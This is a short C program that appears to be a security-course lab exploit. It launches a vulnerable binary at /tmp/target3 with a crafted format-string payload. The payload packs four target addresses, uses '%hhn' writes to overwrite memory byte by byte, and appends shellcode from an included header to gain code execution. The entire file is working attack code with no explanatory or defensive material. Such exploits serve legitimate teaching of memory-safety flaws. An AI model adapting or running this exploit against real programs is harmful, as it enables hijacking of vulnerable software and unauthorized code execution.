#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	char *args[3];
	char *env[1];
	char buf[116];
	char * payload;
	 
	payload = "%08x%191x%hhn%245x%hhn%258x%hhn%191x%hhn";
	strcpy(buf,   "\x64\xfd\xff\xbe");
	strcpy(buf+4, "ZZZZ");
	strcpy(buf+8, "\x65\xfd\xff\xbe"); 
	strcpy(buf+12, "ZZZZ");
	strcpy(buf+16, "\x66\xfd\xff\xbe"); 
	strcpy(buf+20, "ZZZZ"); 		
	strcpy(buf+24, "\x67\xfd\xff\xbe");
	strcpy(buf+28, shellcode);
	strcat(buf, payload);
	strcat(buf, "\x00");

	args[0] = TARGET; args[1]=buf; args[2]=NULL;
	env[0]=NULL;

	if(0>execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
